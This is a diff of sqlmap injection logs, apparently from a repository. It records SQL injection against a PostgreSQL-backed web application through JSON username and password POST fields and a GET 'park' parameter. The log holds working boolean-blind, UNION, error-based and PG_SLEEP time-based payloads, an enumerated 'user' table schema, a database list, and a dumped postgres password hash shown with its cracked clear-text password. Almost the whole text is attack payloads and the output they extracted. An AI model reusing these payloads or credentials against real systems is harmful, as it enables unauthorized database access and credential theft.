+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 8122=(SELECT 8122 FROM PG_SLEEP(5)) AND 'hqqE'='hqqE&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
 ---
 back-end DBMS: PostgreSQL
-Database: public
-Table: user
-[10 columns]
-+--------------+---------+
-| Column       | Type    |
-+--------------+---------+
-| position     | varchar |
-| email        | varchar |
-| id           | int8    |
-| name         | varchar |
-| password     | varchar |
-| phone_number | varchar |
-| remark       | varchar |
-| role         | int8    |
-| status       | int4    |
-| username     | varchar |
-+--------------+---------+
+database management system users password hashes:
+[*] postgres [1]:
+    password hash: md55305adaac499dbbc6865a44e4aa5d8b4
+    clear-text password: passwd
 
 sqlmap resumed the following injection point(s) from stored session:
 ---
-Parameter: JSON password ((custom) POST)
+Parameter: park (GET)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago","password":"670b14728ad9902aecba32e22fa4f6bd' AND 8481=8481 AND 'aawu'='aawu"}
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 1718=1718 AND 'eXru'='eXru&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
 
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"gago","password":"-9993' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(97)||CHR(97)||CHR(107)||CHR(101)||CHR(111)||CHR(120)||CHR(71)||CHR(104)||CHR(104)||CHR(69)||CHR(76)||CHR(118)||CHR(73)||CHR(111)||CHR(83)||CHR(81)||CHR(84)||CHR(68)||CHR(97)||CHR(113)||CHR(71)||CHR(86)||CHR(97)||CHR(82)||CHR(66)||CHR(89)||CHR(78)||CHR(115)||CHR(121)||CHR(68)||CHR(66)||CHR(70)||CHR(87)||CHR(98)||CHR(73)||CHR(68)||CHR(104)||CHR(86)||CHR(65)||CHR(88))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL,NULL,NULL-- CJao"}
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 9706=CAST((CHR(113)||CHR(107)||CHR(112)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9706=9706) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(106)||CHR(113)||CHR(113)) AS NUMERIC) AND 'sRQH'='sRQH&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
 
-Parameter: JSON username ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago' AND 8413=8413 AND 'QHuf'='QHuf","password":"670b14728ad9902aecba32e22fa4f6bd"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"-5187' UNION ALL SELECT NULL,NULL,NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(85)||CHR(103)||CHR(109)||CHR(105)||CHR(97)||CHR(83)||CHR(82)||CHR(121)||CHR(106)||CHR(89)||CHR(101)||CHR(90)||CHR(115)||CHR(77)||CHR(87)||CHR(78)||CHR(115)||CHR(77)||CHR(107)||CHR(89)||CHR(82)||CHR(80)||CHR(89)||CHR(70)||CHR(103)||CHR(65)||CHR(116)||CHR(83)||CHR(69)||CHR(104)||CHR(74)||CHR(79)||CHR(100)||CHR(103)||CHR(72)||CHR(69)||CHR(77)||CHR(122)||CHR(87)||CHR(118))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL-- aBkC","password":"670b14728ad9902aecba32e22fa4f6bd"}
+    Type: AND/OR time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 8122=(SELECT 8122 FROM PG_SLEEP(5)) AND 'hqqE'='hqqE&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
 ---
 back-end DBMS: PostgreSQL
-sqlmap identified the following injection point(s) with a total of 70 HTTP(s) requests:
----
-Parameter: JSON username ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago' AND 4553=4553 AND 'uDoh'='uDoh","password":"670b14728ad9902aecba32e22fa4f6bd"}
+database management system users privileges:
+[*] None [0]:
+[*] 1 [0]:
+[*] p [0]:
 
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"-5913' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,(CHR(113)||CHR(122)||CHR(112)||CHR(98)||CHR(113))||(CHR(118)||CHR(116)||CHR(107)||CHR(90)||CHR(111)||CHR(82)||CHR(74)||CHR(77)||CHR(116)||CHR(109)||CHR(112)||CHR(113)||CHR(75)||CHR(71)||CHR(82)||CHR(118)||CHR(78)||CHR(65)||CHR(103)||CHR(74)||CHR(79)||CHR(100)||CHR(85)||CHR(112)||CHR(102)||CHR(120)||CHR(112)||CHR(112)||CHR(90)||CHR(89)||CHR(73)||CHR(97)||CHR(100)||CHR(76)||CHR(85)||CHR(77)||CHR(102)||CHR(68)||CHR(107)||CHR(105))||(CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(113)),NULL-- QjNF","password":"670b14728ad9902aecba32e22fa4f6bd"}
-
-Parameter: JSON password ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago","password":"670b14728ad9902aecba32e22fa4f6bd' AND 2285=2285 AND 'GgSe'='GgSe"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"gago","password":"-6174' UNION ALL SELECT NULL,NULL,NULL,NULL,(CHR(113)||CHR(122)||CHR(112)||CHR(98)||CHR(113))||(CHR(82)||CHR(80)||CHR(75)||CHR(99)||CHR(105)||CHR(86)||CHR(87)||CHR(118)||CHR(67)||CHR(117)||CHR(116)||CHR(104)||CHR(71)||CHR(86)||CHR(102)||CHR(102)||CHR(118)||CHR(109)||CHR(120)||CHR(76)||CHR(104)||CHR(75)||CHR(100)||CHR(72)||CHR(103)||CHR(109)||CHR(98)||CHR(97)||CHR(87)||CHR(98)||CHR(89)||CHR(66)||CHR(67)||CHR(74)||CHR(74)||CHR(80)||CHR(111)||CHR(102)||CHR(79)||CHR(67))||(CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(113)),NULL,NULL-- gBGO"}
----
-back-end DBMS: PostgreSQL
 sqlmap resumed the following injection point(s) from stored session:
 ---
-Parameter: JSON username ((custom) POST)
+Parameter: park (GET)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago' AND 4553=4553 AND 'uDoh'='uDoh","password":"670b14728ad9902aecba32e22fa4f6bd"}
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 1718=1718 AND 'eXru'='eXru&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
 
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"-5913' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,(CHR(113)||CHR(122)||CHR(112)||CHR(98)||CHR(113))||(CHR(118)||CHR(116)||CHR(107)||CHR(90)||CHR(111)||CHR(82)||CHR(74)||CHR(77)||CHR(116)||CHR(109)||CHR(112)||CHR(113)||CHR(75)||CHR(71)||CHR(82)||CHR(118)||CHR(78)||CHR(65)||CHR(103)||CHR(74)||CHR(79)||CHR(100)||CHR(85)||CHR(112)||CHR(102)||CHR(120)||CHR(112)||CHR(112)||CHR(90)||CHR(89)||CHR(73)||CHR(97)||CHR(100)||CHR(76)||CHR(85)||CHR(77)||CHR(102)||CHR(68)||CHR(107)||CHR(105))||(CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(113)),NULL-- QjNF","password":"670b14728ad9902aecba32e22fa4f6bd"}
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 9706=CAST((CHR(113)||CHR(107)||CHR(112)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9706=9706) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(106)||CHR(113)||CHR(113)) AS NUMERIC) AND 'sRQH'='sRQH&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
 
-Parameter: JSON password ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago","password":"670b14728ad9902aecba32e22fa4f6bd' AND 2285=2285 AND 'GgSe'='GgSe"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"gago","password":"-6174' UNION ALL SELECT NULL,NULL,NULL,NULL,(CHR(113)||CHR(122)||CHR(112)||CHR(98)||CHR(113))||(CHR(82)||CHR(80)||CHR(75)||CHR(99)||CHR(105)||CHR(86)||CHR(87)||CHR(118)||CHR(67)||CHR(117)||CHR(116)||CHR(104)||CHR(71)||CHR(86)||CHR(102)||CHR(102)||CHR(118)||CHR(109)||CHR(120)||CHR(76)||CHR(104)||CHR(75)||CHR(100)||CHR(72)||CHR(103)||CHR(109)||CHR(98)||CHR(97)||CHR(87)||CHR(98)||CHR(89)||CHR(66)||CHR(67)||CHR(74)||CHR(74)||CHR(80)||CHR(111)||CHR(102)||CHR(79)||CHR(67))||(CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(113)),NULL,NULL-- gBGO"}
----
-back-end DBMS: PostgreSQL
-sqlmap identified the following injection point(s) with a total of 70 HTTP(s) requests:
----
-Parameter: JSON username ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago' AND 4209=4209 AND 'roKK'='roKK","password":"670b14728ad9902aecba32e22fa4f6bd"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"-5404' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(98)||CHR(107)||CHR(107)||CHR(113))||(CHR(110)||CHR(66)||CHR(117)||CHR(99)||CHR(119)||CHR(81)||CHR(66)||CHR(107)||CHR(97)||CHR(113)||CHR(113)||CHR(112)||CHR(82)||CHR(77)||CHR(86)||CHR(70)||CHR(77)||CHR(66)||CHR(104)||CHR(88)||CHR(101)||CHR(81)||CHR(97)||CHR(72)||CHR(70)||CHR(109)||CHR(120)||CHR(70)||CHR(88)||CHR(117)||CHR(66)||CHR(70)||CHR(74)||CHR(106)||CHR(122)||CHR(75)||CHR(117)||CHR(116)||CHR(77)||CHR(121))||(CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)),NULL,NULL,NULL,NULL-- xRks","password":"670b14728ad9902aecba32e22fa4f6bd"}
-
-Parameter: JSON password ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago","password":"670b14728ad9902aecba32e22fa4f6bd' AND 4655=4655 AND 'zPTi'='zPTi"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"gago","password":"-8814' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(98)||CHR(107)||CHR(107)||CHR(113))||(CHR(122)||CHR(108)||CHR(86)||CHR(106)||CHR(117)||CHR(114)||CHR(97)||CHR(66)||CHR(115)||CHR(107)||CHR(71)||CHR(67)||CHR(118)||CHR(65)||CHR(71)||CHR(109)||CHR(102)||CHR(80)||CHR(65)||CHR(100)||CHR(90)||CHR(75)||CHR(105)||CHR(78)||CHR(122)||CHR(120)||CHR(76)||CHR(97)||CHR(87)||CHR(112)||CHR(70)||CHR(99)||CHR(112)||CHR(66)||CHR(108)||CHR(78)||CHR(116)||CHR(86)||CHR(102)||CHR(85))||(CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)),NULL,NULL,NULL,NULL-- QRyc"}
+    Type: AND/OR time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 8122=(SELECT 8122 FROM PG_SLEEP(5)) AND 'hqqE'='hqqE&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
 ---
 back-end DBMS: PostgreSQL
 sqlmap resumed the following injection point(s) from stored session:
 ---
-Parameter: JSON username ((custom) POST)
+Parameter: park (GET)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago' AND 4209=4209 AND 'roKK'='roKK","password":"670b14728ad9902aecba32e22fa4f6bd"}
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 1718=1718 AND 'eXru'='eXru&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
 
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"-5404' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(98)||CHR(107)||CHR(107)||CHR(113))||(CHR(110)||CHR(66)||CHR(117)||CHR(99)||CHR(119)||CHR(81)||CHR(66)||CHR(107)||CHR(97)||CHR(113)||CHR(113)||CHR(112)||CHR(82)||CHR(77)||CHR(86)||CHR(70)||CHR(77)||CHR(66)||CHR(104)||CHR(88)||CHR(101)||CHR(81)||CHR(97)||CHR(72)||CHR(70)||CHR(109)||CHR(120)||CHR(70)||CHR(88)||CHR(117)||CHR(66)||CHR(70)||CHR(74)||CHR(106)||CHR(122)||CHR(75)||CHR(117)||CHR(116)||CHR(77)||CHR(121))||(CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)),NULL,NULL,NULL,NULL-- xRks","password":"670b14728ad9902aecba32e22fa4f6bd"}
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 9706=CAST((CHR(113)||CHR(107)||CHR(112)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9706=9706) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(106)||CHR(113)||CHR(113)) AS NUMERIC) AND 'sRQH'='sRQH&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
 
-Parameter: JSON password ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago","password":"670b14728ad9902aecba32e22fa4f6bd' AND 4655=4655 AND 'zPTi'='zPTi"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"gago","password":"-8814' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(98)||CHR(107)||CHR(107)||CHR(113))||(CHR(122)||CHR(108)||CHR(86)||CHR(106)||CHR(117)||CHR(114)||CHR(97)||CHR(66)||CHR(115)||CHR(107)||CHR(71)||CHR(67)||CHR(118)||CHR(65)||CHR(71)||CHR(109)||CHR(102)||CHR(80)||CHR(65)||CHR(100)||CHR(90)||CHR(75)||CHR(105)||CHR(78)||CHR(122)||CHR(120)||CHR(76)||CHR(97)||CHR(87)||CHR(112)||CHR(70)||CHR(99)||CHR(112)||CHR(66)||CHR(108)||CHR(78)||CHR(116)||CHR(86)||CHR(102)||CHR(85))||(CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)),NULL,NULL,NULL,NULL-- QRyc"}
+    Type: AND/OR time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 8122=(SELECT 8122 FROM PG_SLEEP(5)) AND 'hqqE'='hqqE&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
 ---
 back-end DBMS: PostgreSQL
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: JSON password ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago","password":"670b14728ad9902aecba32e22fa4f6bd' AND 8481=8481 AND 'aawu'='aawu"}
+\d [1]:
 
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"gago","password":"-9993' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(97)||CHR(97)||CHR(107)||CHR(101)||CHR(111)||CHR(120)||CHR(71)||CHR(104)||CHR(104)||CHR(69)||CHR(76)||CHR(118)||CHR(73)||CHR(111)||CHR(83)||CHR(81)||CHR(84)||CHR(68)||CHR(97)||CHR(113)||CHR(71)||CHR(86)||CHR(97)||CHR(82)||CHR(66)||CHR(89)||CHR(78)||CHR(115)||CHR(121)||CHR(68)||CHR(66)||CHR(70)||CHR(87)||CHR(98)||CHR(73)||CHR(68)||CHR(104)||CHR(86)||CHR(65)||CHR(88))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL,NULL,NULL-- CJao"}
+selec * from park limit 5; [5]:
+[*] 
+[*] 
+[*] 
+[*] 
+[*] 
 
-Parameter: JSON username ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago' AND 8413=8413 AND 'QHuf'='QHuf","password":"670b14728ad9902aecba32e22fa4f6bd"}
+selec breed from park limit 5; [5]:
+[*] 
+[*] 
+[*] 
+[*] 
+[*] 
 
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"-5187' UNION ALL SELECT NULL,NULL,NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(85)||CHR(103)||CHR(109)||CHR(105)||CHR(97)||CHR(83)||CHR(82)||CHR(121)||CHR(106)||CHR(89)||CHR(101)||CHR(90)||CHR(115)||CHR(77)||CHR(87)||CHR(78)||CHR(115)||CHR(77)||CHR(107)||CHR(89)||CHR(82)||CHR(80)||CHR(89)||CHR(70)||CHR(103)||CHR(65)||CHR(116)||CHR(83)||CHR(69)||CHR(104)||CHR(74)||CHR(79)||CHR(100)||CHR(103)||CHR(72)||CHR(69)||CHR(77)||CHR(122)||CHR(87)||CHR(118))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL-- aBkC","password":"670b14728ad9902aecba32e22fa4f6bd"}
----
-back-end DBMS: PostgreSQL
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: JSON password ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago","password":"670b14728ad9902aecba32e22fa4f6bd' AND 8481=8481 AND 'aawu'='aawu"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"gago","password":"-9993' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(97)||CHR(97)||CHR(107)||CHR(101)||CHR(111)||CHR(120)||CHR(71)||CHR(104)||CHR(104)||CHR(69)||CHR(76)||CHR(118)||CHR(73)||CHR(111)||CHR(83)||CHR(81)||CHR(84)||CHR(68)||CHR(97)||CHR(113)||CHR(71)||CHR(86)||CHR(97)||CHR(82)||CHR(66)||CHR(89)||CHR(78)||CHR(115)||CHR(121)||CHR(68)||CHR(66)||CHR(70)||CHR(87)||CHR(98)||CHR(73)||CHR(68)||CHR(104)||CHR(86)||CHR(65)||CHR(88))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL,NULL,NULL-- CJao"}
-
-Parameter: JSON username ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago' AND 8413=8413 AND 'QHuf'='QHuf","password":"670b14728ad9902aecba32e22fa4f6bd"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"-5187' UNION ALL SELECT NULL,NULL,NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(85)||CHR(103)||CHR(109)||CHR(105)||CHR(97)||CHR(83)||CHR(82)||CHR(121)||CHR(106)||CHR(89)||CHR(101)||CHR(90)||CHR(115)||CHR(77)||CHR(87)||CHR(78)||CHR(115)||CHR(77)||CHR(107)||CHR(89)||CHR(82)||CHR(80)||CHR(89)||CHR(70)||CHR(103)||CHR(65)||CHR(116)||CHR(83)||CHR(69)||CHR(104)||CHR(74)||CHR(79)||CHR(100)||CHR(103)||CHR(72)||CHR(69)||CHR(77)||CHR(122)||CHR(87)||CHR(118))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL-- aBkC","password":"670b14728ad9902aecba32e22fa4f6bd"}
----
-back-end DBMS: PostgreSQL
-Database: public
-Table: user
-[10 columns]
-+--------------+---------+
-| Column       | Type    |
-+--------------+---------+
-| position     | varchar |
-| email        | varchar |
-| id           | int8    |
-| name         | varchar |
-| password     | varchar |
-| phone_number | varchar |
-| remark       | varchar |
-| role         | int8    |
-| status       | int4    |
-| username     | varchar |
-+--------------+---------+
-
-sqlmap identified the following injection point(s) with a total of 44 HTTP(s) requests:
----
-Parameter: JSON username ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago' AND 6984=6984 AND 'mDkT'='mDkT","password":"670b14728ad9902aecba32e22fa4f6bd"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"-2899' UNION ALL SELECT NULL,NULL,NULL,NULL,(CHR(113)||CHR(106)||CHR(118)||CHR(113)||CHR(113))||(CHR(73)||CHR(103)||CHR(86)||CHR(84)||CHR(97)||CHR(116)||CHR(67)||CHR(107)||CHR(76)||CHR(87)||CHR(122)||CHR(81)||CHR(105)||CHR(120)||CHR(100)||CHR(116)||CHR(67)||CHR(81)||CHR(98)||CHR(118)||CHR(112)||CHR(83)||CHR(80)||CHR(111)||CHR(97)||CHR(103)||CHR(89)||CHR(100)||CHR(103)||CHR(67)||CHR(97)||CHR(112)||CHR(115)||CHR(108)||CHR(81)||CHR(65)||CHR(77)||CHR(66)||CHR(110)||CHR(89))||(CHR(113)||CHR(118)||CHR(113)||CHR(106)||CHR(113)),NULL,NULL-- CfUV","password":"670b14728ad9902aecba32e22fa4f6bd"}
----
-back-end DBMS: PostgreSQL
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: JSON username ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago' AND 6984=6984 AND 'mDkT'='mDkT","password":"670b14728ad9902aecba32e22fa4f6bd"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"-2899' UNION ALL SELECT NULL,NULL,NULL,NULL,(CHR(113)||CHR(106)||CHR(118)||CHR(113)||CHR(113))||(CHR(73)||CHR(103)||CHR(86)||CHR(84)||CHR(97)||CHR(116)||CHR(67)||CHR(107)||CHR(76)||CHR(87)||CHR(122)||CHR(81)||CHR(105)||CHR(120)||CHR(100)||CHR(116)||CHR(67)||CHR(81)||CHR(98)||CHR(118)||CHR(112)||CHR(83)||CHR(80)||CHR(111)||CHR(97)||CHR(103)||CHR(89)||CHR(100)||CHR(103)||CHR(67)||CHR(97)||CHR(112)||CHR(115)||CHR(108)||CHR(81)||CHR(65)||CHR(77)||CHR(66)||CHR(110)||CHR(89))||(CHR(113)||CHR(118)||CHR(113)||CHR(106)||CHR(113)),NULL,NULL-- CfUV","password":"670b14728ad9902aecba32e22fa4f6bd"}
----
-back-end DBMS: PostgreSQL
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: JSON username ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago' AND 6984=6984 AND 'mDkT'='mDkT","password":"670b14728ad9902aecba32e22fa4f6bd"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"-2899' UNION ALL SELECT NULL,NULL,NULL,NULL,(CHR(113)||CHR(106)||CHR(118)||CHR(113)||CHR(113))||(CHR(73)||CHR(103)||CHR(86)||CHR(84)||CHR(97)||CHR(116)||CHR(67)||CHR(107)||CHR(76)||CHR(87)||CHR(122)||CHR(81)||CHR(105)||CHR(120)||CHR(100)||CHR(116)||CHR(67)||CHR(81)||CHR(98)||CHR(118)||CHR(112)||CHR(83)||CHR(80)||CHR(111)||CHR(97)||CHR(103)||CHR(89)||CHR(100)||CHR(103)||CHR(67)||CHR(97)||CHR(112)||CHR(115)||CHR(108)||CHR(81)||CHR(65)||CHR(77)||CHR(66)||CHR(110)||CHR(89))||(CHR(113)||CHR(118)||CHR(113)||CHR(106)||CHR(113)),NULL,NULL-- CfUV","password":"670b14728ad9902aecba32e22fa4f6bd"}
----
-back-end DBMS: PostgreSQL
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: JSON password ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago","password":"670b14728ad9902aecba32e22fa4f6bd' AND 8481=8481 AND 'aawu'='aawu"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"gago","password":"-9993' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(97)||CHR(97)||CHR(107)||CHR(101)||CHR(111)||CHR(120)||CHR(71)||CHR(104)||CHR(104)||CHR(69)||CHR(76)||CHR(118)||CHR(73)||CHR(111)||CHR(83)||CHR(81)||CHR(84)||CHR(68)||CHR(97)||CHR(113)||CHR(71)||CHR(86)||CHR(97)||CHR(82)||CHR(66)||CHR(89)||CHR(78)||CHR(115)||CHR(121)||CHR(68)||CHR(66)||CHR(70)||CHR(87)||CHR(98)||CHR(73)||CHR(68)||CHR(104)||CHR(86)||CHR(65)||CHR(88))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL,NULL,NULL-- CJao"}
-
-Parameter: JSON username ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago' AND 8413=8413 AND 'QHuf'='QHuf","password":"670b14728ad9902aecba32e22fa4f6bd"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"-5187' UNION ALL SELECT NULL,NULL,NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(85)||CHR(103)||CHR(109)||CHR(105)||CHR(97)||CHR(83)||CHR(82)||CHR(121)||CHR(106)||CHR(89)||CHR(101)||CHR(90)||CHR(115)||CHR(77)||CHR(87)||CHR(78)||CHR(115)||CHR(77)||CHR(107)||CHR(89)||CHR(82)||CHR(80)||CHR(89)||CHR(70)||CHR(103)||CHR(65)||CHR(116)||CHR(83)||CHR(69)||CHR(104)||CHR(74)||CHR(79)||CHR(100)||CHR(103)||CHR(72)||CHR(69)||CHR(77)||CHR(122)||CHR(87)||CHR(118))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL-- aBkC","password":"670b14728ad9902aecba32e22fa4f6bd"}
----
-back-end DBMS: PostgreSQL
-available databases [3]:
-[*] information_schema
-[*] pg_catalog
-[*] public
+select databases; [1]:
 
